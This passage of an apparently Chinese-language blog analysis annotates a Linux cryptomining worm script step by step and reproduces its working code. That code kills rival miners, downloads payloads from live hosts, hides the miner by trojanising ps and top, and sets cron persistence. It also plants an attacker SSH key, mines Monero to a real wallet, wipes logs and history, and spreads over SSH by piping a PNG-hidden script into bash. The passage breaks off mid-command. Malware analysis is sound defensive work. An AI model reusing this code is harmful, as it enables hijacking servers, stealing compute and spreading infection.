class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nMrfmnRa&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;PuNY5tm2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;I0r8Jyyt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AgdgACUD&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;uiZvwxG8&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;BtwXn5qH&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3XEzey2T&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;t2tKrCSZ&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;svc&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HD7fcBgg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;zXcDajSs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3lmigMo&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AkMK4A2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AJ2AkKe&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>杀掉除了zzh之外的占用超过cpu超40%的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">kill_sus_proc</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    ps axf -o <span class="string">&quot;pid&quot;</span>|<span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            ls -l /proc/<span class="variable">$procid</span>/exe | grep /tmp</span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 1 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">                    <span class="keyword">then</span></span><br><span class="line">                            <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">                    <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    ps axf -o <span class="string">&quot;pid %cpu&quot;</span> | awk <span class="string">&#x27;&#123;if($2&gt;=40.0) print $1&#125;&#x27;</span> | <span class="keyword">while</span> <span class="built_in">read</span> procid</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">            cat /proc/<span class="variable">$procid</span>/cmdline| grep -a -E <span class="string">&quot;zzh&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">            <span class="keyword">then</span></span><br><span class="line">                    <span class="built_in">kill</span> -9 <span class="variable">$procid</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;don&#x27;t kill&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义下载函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">downloads</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/usr/bin/curl&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span> </span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$1</span>,<span class="variable">$2</span></span><br><span class="line">        http_code=`curl -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curl --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/cd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        http_code=`cd1 -I -m 50 -o /dev/null -s -w %&#123;http_code&#125; <span class="variable">$1</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;200&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$http_code</span>&quot;</span> -eq <span class="string">&quot;405&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$1</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cd1 --connect-timeout 100 --retry 100 <span class="variable">$3</span> &gt; <span class="variable">$2</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wget&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wget --timeout=50 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -ne 0 ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    wget --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">elif</span> [ -f <span class="string">&quot;/usr/bin/wd1&quot;</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$1</span></span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">            wd1 --timeout=100 --tries=100 -O <span class="variable">$2</span> <span class="variable">$3</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-chattr.html">chattr命令简介</a></p><p>使用chattr定义上锁解锁函数</p><p>-R +ia递归上锁</p><p>-R -ia递归解锁</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">unlock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R -ia /var/spool/cron</span><br><span class="line">    chattr -ia /etc/crontab</span><br><span class="line">    chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R -ia /etc/cron.d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">lock_cron</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    chattr -R +ia /var/spool/cron</span><br><span class="line">    chattr +ia /etc/crontab</span><br><span class="line">    chattr -R +ia /var/spool/cron/crontabs</span><br><span class="line">    chattr -R +ia /etc/cron.d</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断$rtdir是否存在，在上面定义过：</p><p>rtdir=”/etc/zzhs”</p><p>存在就进行，更改了ps和top命令，使用grep -v命令过滤zzh,pnscan</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg:echo <span class="string">&quot;asasasas&quot;</span> | grep -v <span class="string">&quot;b&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;$rtdir&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        echo <span class="string">&quot;i am root&quot;</span></span><br><span class="line">        mkdir -p /root/.ssh</span><br><span class="line">        echo <span class="string">&quot;goto 1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>zzhs</span><br><span class="line">        chattr -ia /etc/zzh*</span><br><span class="line">        chattr -ia /etc/newinit.sh*</span><br><span class="line">        chattr -ia /root/.ssh/authorized_keys*</span><br><span class="line">        chattr -R -ia /root/.ssh</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/ps /bin/ps.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        echo <span class="string">&quot;ps.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>ps</span><br><span class="line">        chmod +x /bin/ps</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/ps</span><br><span class="line">        echo <span class="string">&quot;/bin/ps changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/top.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/top changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/top /bin/top.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        echo <span class="string">&quot;top.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>top</span><br><span class="line">        chmod +x /bin/top</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/top</span><br><span class="line">        echo <span class="string">&quot;/bin/top changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/pstree.original&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changed&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        mv /bin/pstree /bin/pstree.original </span><br><span class="line">        echo <span class="string">&quot;#! /bin/bash&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        echo <span class="string">&quot;pstree.original \$@ | grep -v \&quot;zzh\|pnscan\&quot;&quot;</span>&gt;&gt;<span class="regexp">/bin/</span>pstree</span><br><span class="line">        chmod +x /bin/pstree</span><br><span class="line">    touch -d <span class="number">20160825</span> /bin/pstree</span><br><span class="line">        echo <span class="string">&quot;/bin/pstree changing&quot;</span></span><br><span class="line">    fi</span><br><span class="line">    <span class="keyword">if</span> [ -f <span class="string">&quot;/bin/chattr&quot;</span> ]</span><br><span class="line">  then</span><br><span class="line">    chattrsize=<span class="string">`ls -l /bin/chattr | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;$chattrsize&quot;</span> -lt <span class="string">&quot;$chattr_size&quot;</span> ]</span><br><span class="line">    then</span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo <span class="string">&quot;no need install chattr&quot;</span></span><br><span class="line">    fi</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      yum -y remove e2fsprogs</span><br><span class="line">            yum -y install e2fsprogs</span><br></pre></td></tr></table></figure><p>先解锁，设置挖矿程序任务</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">unlock_cron</span><br><span class="line">                  rm -f $&#123;crondir&#125;</span><br><span class="line">                  rm -f /etc/cron.d/zzh</span><br><span class="line">                  rm -f /etc/crontab</span><br><span class="line">echo <span class="string">&quot;*/30 * * * * sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; $&#123;crondir&#125;</span><br><span class="line">echo <span class="string">&quot;*/40 * * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>cron.d/zzh</span><br><span class="line">echo <span class="string">&quot;0 1 * * * root sh /etc/newinit.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> &gt;&gt; <span class="regexp">/etc/</span>crontab</span><br><span class="line">                  echo crontab created</span><br><span class="line">lock_cron</span><br></pre></td></tr></table></figure><p>设置免密登录，往authorized_keys里面写公钥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> /root/.ssh/</span><br><span class="line">echo &gt;&gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">chmod <span class="number">600</span> /root/.ssh/authorized_keys</span><br><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver&quot;</span> &gt; <span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">cd1 http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line">wget -q -O- http:<span class="comment">//106.15.74.113/b2f628/call.txt</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">file=<span class="string">&quot;/etc/zzh&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>判断zzh存不存在，开始download挖矿程序</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/etc/zzh&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">        filesize1=<span class="string">`ls -l /etc/zzh | awk &#x27;&#123; print $5 &#125;&#x27;`</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;$filesize1&quot;</span> -ne <span class="string">&quot;$miner_size&quot;</span> ] </span><br><span class="line">        then</span><br><span class="line">            pkill -f zzh</span><br><span class="line">            rm /etc/zzh</span><br><span class="line">            downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            echo <span class="string">&quot;not need download&quot;</span></span><br><span class="line">        fi</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        downloads $miner_url /etc/zzh $miner_url_backup</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">downloads $sh_url /etc/indexni.png $sh_url_backup</span><br><span class="line">cd /etc/;dd <span class="keyword">if</span>=indexni.png <span class="keyword">of</span>=newinit.sh skip=<span class="number">17704</span> bs=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>如果启动脚本时参数不为1就不启动</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">chmod <span class="number">777</span> /etc/zzh</span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/bin/ps.original&quot;</span> ]</span><br><span class="line">then</span><br><span class="line">    ps.original -fe|grep zzh |grep -v grep</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ps -fe|grep zzh |grep -v grep</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ $? -ne <span class="number">0</span> ]</span><br><span class="line">then</span><br><span class="line">            cd /etc</span><br><span class="line">            echo <span class="string">&quot;not root runing&quot;</span></span><br><span class="line">            sleep 5s</span><br><span class="line">            cpunum=<span class="string">`cat /proc/cpuinfo |grep -i model|grep name|wc -l`</span></span><br></pre></td></tr></table></figure><p>判断cpu核数启动挖矿程序</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">2</span> )); then</span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">4</span>)); then</span><br><span class="line">      cpunum=<span class="number">2</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">8</span>)); then</span><br><span class="line">      cpunum=<span class="number">4</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">16</span>)); then</span><br><span class="line">      cpunum=<span class="number">8</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">32</span>)); then</span><br><span class="line">      cpunum=<span class="number">16</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&lt;=<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">32</span></span><br><span class="line">      echo $cpunum</span><br><span class="line">elif ((<span class="string">&quot;$cpunum&quot;</span>&gt;<span class="number">64</span>)); then</span><br><span class="line">      cpunum=<span class="number">50</span></span><br><span class="line">      echo $cpunum</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">      cpunum=<span class="number">1</span></span><br><span class="line">fi</span><br><span class="line">                ./zzh -B --log-file=<span class="regexp">/etc/</span>etc --coin=monero -o stratum+tcp:<span class="comment">//xmr-asia1.nanopool.org:14444 --threads=$cpunum -u 4B1fHgyJ7nJMZPudMrqULw2xoVZfTrinLHJWFJqytnNYTQEVFATKqBnFGSurDPyDCefrHU1QbSCe7A7jDoyKJcUcEaif3Qs.3910 -p x &amp;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">                echo <span class="string">&quot;root runing.....&quot;</span></span><br></pre></td></tr></table></figure><p>开放端口，重启防火墙，清除历史命令</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">5555</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">7777</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport <span class="number">9999</span> -j DROP</span><br><span class="line">service iptables reload</span><br><span class="line">ps auxf|grep -v grep|grep -v 43Xbgtym2GZWBk87XiYbCpTKGPBTxY|grep <span class="string">&quot;stratum&quot;</span>|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|xargs kill -<span class="number">9</span></span><br><span class="line">history -c</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>spool/mail/root</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/wtmp</span><br><span class="line">echo &gt; <span class="regexp">/var/</span>log/secure</span><br><span class="line">echo &gt; <span class="regexp">/root/</span>.bash_history</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>感染设置了免密登录的主机</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">yum install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line">apt-get install -y bash <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;curl -o indexis.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png || wd1 https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexis.png -O indexis.png;dd if=indexis.png of=is.sh skip=17704 bs=1;cat is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#x27;</span> &amp; done</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ -f /root/.ssh/known_hosts ] &amp;&amp; [ -f /root/.ssh/id_rsa.pub ]; then</span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> $(grep -oE <span class="string">&quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;</span> /root/.ssh/known_hosts); <span class="keyword">do</span> ssh -oBatchMode=yes -oConnectTimeout=<span class="number">5</span> -oStrictHostKeyChecking=no $h <span class="string">&#x27;cd1 -o  indexis.png 